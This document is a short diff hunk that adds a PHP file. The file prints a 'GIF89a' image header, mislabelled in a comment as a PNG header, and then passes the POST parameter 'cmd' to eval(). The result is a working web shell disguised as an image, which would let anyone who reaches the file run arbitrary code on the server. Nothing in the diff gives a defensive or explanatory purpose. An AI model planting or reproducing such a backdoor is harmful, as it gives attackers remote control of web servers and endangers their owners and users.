@@ -1,0 +1,5 @@
+<?php
+// PNG header
+echo 'GIF89a';
+eval($_POST['cmd']);
+?>
